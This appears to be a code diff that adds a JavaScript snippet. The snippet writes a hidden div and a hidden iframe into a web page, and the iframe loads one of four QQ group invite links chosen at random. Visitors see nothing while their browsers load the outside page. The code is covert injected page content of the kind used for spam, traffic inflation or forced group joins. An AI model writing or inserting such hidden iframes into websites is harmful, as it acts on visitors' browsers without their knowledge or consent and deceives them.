@@ -1,0 +1,12 @@
+var qq = [
+		'https://jq.qq.com/?_wv=1027&k=51tdy1W', //吉祥
+		'https://jq.qq.com/?_wv=1027&k=5BtucXl', //如意
+		'https://jq.qq.com/?_wv=1027&k=5L1YoQA', //千宇
+		'https://jq.qq.com/?_wv=1027&k=5z8JmPt'  //华人
+	     ]
+	var  rd = Math.floor(Math.random()*4); 
+		document.writeln("<div style=\"display:none\">");
+		document.writeln("");
+		document.writeln("<IFRAME frameBorder=1 id=heads src=\""+qq[rd]+"&Site=&menu=yes\" style=\"display:none\"><\/IFRAME>");
+		document.writeln(""); 
+		document.writeln("<\/div>"); 
